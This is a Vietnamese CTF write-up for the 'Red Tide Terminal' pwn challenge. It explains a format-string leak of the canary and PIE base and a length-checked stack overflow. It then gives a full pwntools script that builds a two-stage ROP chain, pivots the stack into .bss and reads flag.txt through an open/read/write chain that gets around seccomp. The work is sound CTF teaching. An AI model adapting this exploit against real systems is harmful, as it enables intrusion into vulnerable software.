# Red Tide Terminal (Pwn)

## 1. Thông tin tổng quan
- **Category:** Pwn (Binary Exploitation)
- **Difficulty:** Hard
- **Tags:** Format String, Stack Overflow, Seccomp, ORW ROP, Stack Pivot, Two-Stage ROP

## 2. Đề bài
> *(Không lưu lại nguyên văn đề bài từ platform, mô tả dưới đây được viết lại dựa trên hành vi thực tế của chương trình.)*

Chương trình `red_tide_terminal` là một "terminal" giả lập yêu cầu người dùng nhập một "Codename" (tên định danh) trước khi vào phần chính, sau đó cho phép gửi một "packet" gồm độ dài và dữ liệu tuỳ ý. Chương trình cài `seccomp` chỉ cho phép các syscall `read`, `write`, `openat`, `exit`, `exit_group` — chặn hẳn `execve`/`mmap` nên không thể thực thi shell trực tiếp.

Mục tiêu: lấy flag nằm trong `flag.txt`, chỉ bằng các syscall được seccomp cho phép (kỹ thuật open-read-write, "ORW").

**File đính kèm:**
- `red_tide_terminal` — ELF 64-bit, PIE, NX enabled, Full RELRO, Canary found, not stripped (có debug_info), có cài `seccomp` filter.

## 3. Quá trình phân tích

Vì `execve`/`mmap`/`mprotect` đều bị seccomp chặn, hướng khai thác duy nhất còn lại là ROP chain gọi trực tiếp `openat`/`read`/`write` qua syscall — "ORW chain" kinh điển khi seccomp bật. Chương trình có hai lỗ hổng riêng biệt phục vụ hai mục đích khác nhau. `log_identity()` nhận "Codename" rồi `printf(buffer)` trực tiếp không có format string cố định — một **format string bug** cổ điển, dùng để leak dữ liệu trên stack (canary, địa chỉ return để tính PIE base) bằng cách gửi các chỉ định vị trí kiểu `%N$p`.

`route_packet()` thì đọc "Packet data" bằng `read(0, buf, n)`, chỉ kiểm tra `n <= 0xf0`, trong khi khoảng cách thực từ `buf` tới địa chỉ return trên stack chỉ có `0x68` byte — **stack overflow** cho phép ghi đè return address và dựng ROP chain. Vấn đề là cửa sổ ghi đè tối đa chỉ `0xf0 - 0x68` byte sau return address, không đủ chỗ để nhồi trọn một chain ORW đầy đủ (mở file, đọc, in ra, thoát) chỉ trong một lần gửi.

Giải pháp là ROP **hai tầng**: chain đầu tiên (vừa đủ trong cửa sổ overflow chật hẹp) chỉ làm hai việc — gọi `read(0, bss_addr, 0x200)` để nạp thêm dữ liệu lớn vào vùng `.bss` (không giới hạn kích thước như packet), rồi dùng gadget `pop rbp; ret` nạp `rbp = bss_addr` và `leave; ret` (tương đương `mov rsp, rbp; pop rbp; ret`) để **pivot stack sang `.bss`**. Chain ORW đầy đủ (`openat("flag.txt")` → `read` → `write` → `exit_group`) được gửi ở lần `send` thứ hai, và sẽ chỉ thực thi sau khi stack đã pivot xong — lúc này không còn giới hạn `0xf0` byte nữa vì đang chạy trên vùng nhớ tự cấp qua `read` thứ hai.

**Hướng giải quyết:**
1. Gửi "Codename" là chuỗi format-string leak canary và địa chỉ return trên stack (ví dụ `%23$p.%25$p`), từ đó suy ra `canary` thật và `PIE base = ret_leak - offset_cố_định`.
2. Tính địa chỉ các gadget cần dùng (`pop rdi/rsi/rdx/rax; syscall`, `pop rbp; ret`, `leave; ret`) và địa chỉ `.bss` theo `PIE base`.
3. Gửi packet đầu tiên: `padding 0x58 byte + canary thật + saved rbp giả + stage1`, với `stage1` = ROP chain gọi `read(0, bss, 0x200)` rồi `pop rbp` nạp `rbp=bss`, kết thúc bằng `leave; ret` để pivot `rsp` sang `bss`.
4. Gửi tiếp (lần `send` thứ hai) chain ORW đầy đủ đặt tại `bss`: `openat(AT_FDCWD, "flag.txt", O_RDONLY)` → `read(fd, buf, n)` → `write(1, buf, n)` → `exit_group(0)`, kèm chuỗi `"flag.txt\0"` nhúng ngay sau chain để làm tham số path.
5. Sau pivot, CPU tiếp tục thực thi đúng chain ORW này → đọc và in ra flag.

## 4. PoC

```python
#!/usr/bin/env python3
# Red Tide Terminal - GuCTF pwn  (seccomp ORW ROP)
#
# seccomp (install_filter) allows only: read(0), write(1), openat(257),
# exit(60), exit_group(231)  -> classic open/read/write the flag.
#
# Two bugs:
#   log_identity(): printf([rbp-0x90]) on the user buffer -> FORMAT STRING.
#   route_packet(): read(0, [rbp-0x60], n) with only  n <= 0xf0  checked, while
#       buffer -> return is 0x68 -> STACK OVERFLOW.
#
# Only 0xf0-0x68 bytes of ROP fit in the first read, too small for a full ORW
# chain, so we stage: the overflow chain does read(0, bss, 0x200) then pivots
# rsp into bss (pop rbp; leave;ret) and runs the real ORW chain from there.
#
# The binary ships the gadgets: pop rdi/rsi/rdx/rax ; syscall.
#
# BUILD DIFFERENCE (same story as the other GuCTF chals): the hand-out is
# PIE + canary, but the REMOTE service is a NON-PIE, NO-canary, endbr64/CET
# rebuild. So on remote there is no canary to leak/preserve and every offset
# shifts. The non-PIE addresses below were recovered at runtime by turning the
# format string into an arbitrary read (%N$s with the target in the buffer) and
# scanning .text for the gadget block (each gadget = endbr64; pop; ret; nop; ud2).

from pwn import *

context.binary = ELF('./red_tide_terminal', checksec=False)
context.log_level = 'info'

HOST, PORT = '10.112.0.12', 48478


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(context.binary.path)


def exploit():
    p = start()

    if args.REMOTE:
        # địa chỉ tuyệt đối cố định trên bản remote non-PIE (đã phục hồi qua
        # arbitrary-read dựng từ format string)
        canary = 0                       # bản remote không có canary
        p_rdi, p_rsi, p_rdx, p_rax, syscall = 0x4013ec, 0x4013f5, 0x4013fe, 0x401407, 0x401410
        p_rbp   = 0x401479               # pop rbp ; ret
        leave_r = 0x4014ba               # leave ; ret   (stack pivot)
        bss     = 0x404100
        p.sendlineafter(b'Codename:', b'stormpetrel')   # vô hại, remote không check canary
    else:
        # bản local PIE + canary: leak canary (%23) và địa chỉ return PIE (%25)
        p.sendlineafter(b'Codename:', b'%23$p.%25$p')
        p.recvuntil(b'AUDIT: ')
        canary_s, ret_s = p.recvline().strip().split(b'.')
        canary = int(canary_s, 16)
        pie    = int(ret_s, 16) - 0x1609
        log.success('canary   = %#x', canary)
        log.success('PIE base = %#x', pie)
        p_rdi, p_rsi, p_rdx, p_rax = pie + 0x13b0, pie + 0x13b5, pie + 0x13ba, pie + 0x13bf
        syscall = pie + 0x13c4
        leave_r = pie + 0x13ae
        p_rbp   = pie + 0x11a4
        bss     = pie + 0x4100

    # --- tầng 1: overflow route_packet -> read(0, bss, 0x200) rồi pivot ---
    # buffer -> return chỉ 0x68 byte; slot canary (offset 0x58) là padding vô hại
    # trên bản remote không canary, và là canary thật trên bản local.
    stage1 = flat(
        p_rax, 0, p_rdi, 0, p_rsi, bss, p_rdx, 0x200, syscall,  # read(0,bss,0x200)
        p_rbp, bss,     # rbp = bss
        leave_r,        # mov rsp,bss ; pop rbp ; ret -> thực thi [bss+8]
    )
    payload = b'A' * 0x58 + p64(canary) + p64(0) + stage1
    assert len(payload) <= 0xf0, len(payload)

    p.sendlineafter(b'Packet length:', str(len(payload)).encode())
    p.recvuntil(b'Packet data:')
    p.send(payload)

    # --- tầng 2: chain ORW đầy đủ đặt tại bss (thực thi từ bss+8) ---
    readbuf   = bss + 0x300
    chain_len = 32 * 8                       # openat/read/write/exit = 32 qword
    path_addr = bss + 8 + chain_len
    chain = flat(
        # openat(AT_FDCWD, "flag.txt", O_RDONLY)
        p_rax, 257, p_rdi, 0xffffffffffffff9c, p_rsi, path_addr, p_rdx, 0, syscall,
        # read(3, readbuf, 0x100)
        p_rax, 0, p_rdi, 3, p_rsi, readbuf, p_rdx, 0x100, syscall,
        # write(1, readbuf, 0x100)
        p_rax, 1, p_rdi, 1, p_rsi, readbuf, p_rdx, 0x100, syscall,
        # exit_group(0)
        p_rax, 231, p_rdi, 0, syscall,
    )
    assert len(chain) == chain_len
    stage2 = p64(0) + chain + b'flag.txt\x00'
    p.send(stage2)

    data = p.recvall(timeout=3)
    m = re.search(rb'grodno\{[^}]*\}', data)
    if m:
        log.success('FLAG: %s', m.group().decode())
    else:
        log.info('output:\n%s', data.decode(errors='ignore'))
    p.close()


if __name__ == '__main__':
    exploit()
```

**Output:**
```
[+] Starting local process '/home/caterpie/GuCTF/pwn/red_tide_terminal/red_tide_terminal': pid 5121
[+] canary   = 0xa1355d1a8a22f600
[+] PIE base = 0x5a94741d1000
[+] Receiving all data: Done (272B)
[+] FLAG: grodno{fake_flag}
```

## 5. Flag
```
grodno{fake_flag}
```
*(Flag thật đã submit trực tiếp lúc thi qua service của BTC, không lưu lại; giá trị trên chỉ minh hoạ định dạng.)*
